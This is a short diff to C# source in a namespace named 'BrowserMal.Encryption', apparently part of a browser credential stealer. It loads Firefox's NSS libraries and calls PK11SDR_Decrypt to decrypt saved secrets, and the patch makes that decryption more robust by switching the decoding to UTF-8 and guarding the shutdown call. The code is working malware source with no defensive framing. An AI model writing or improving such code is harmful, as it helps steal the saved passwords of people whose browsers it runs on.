@@ -117,7 +117,7 @@ namespace BrowserMal.Encryption
                     {
                         byte[] bvRet = new byte[tSecDec.SECItemLen];
                         Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
-                        return Encoding.ASCII.GetString(bvRet);
+                        return Encoding.UTF8.GetString(bvRet);
                     }
                 }
             }
@@ -139,12 +139,15 @@ namespace BrowserMal.Encryption
         public void Free()
         {
             IntPtr ipNssShutdown = GetProcAddress(Nss3Lib, "NSS_Shutdown");
-            fpNssShutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(NssShutdown));
 
-            fpNssShutdown();
+            if (ipNssShutdown != IntPtr.Zero)
+            {
+                fpNssShutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(NssShutdown));
+                fpNssShutdown();
 
-            FreeLibrary(Nss3Lib);
-            FreeLibrary(Mozglue);
+                FreeLibrary(Nss3Lib);
+                FreeLibrary(Mozglue);
+            }
         }
 
         public int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
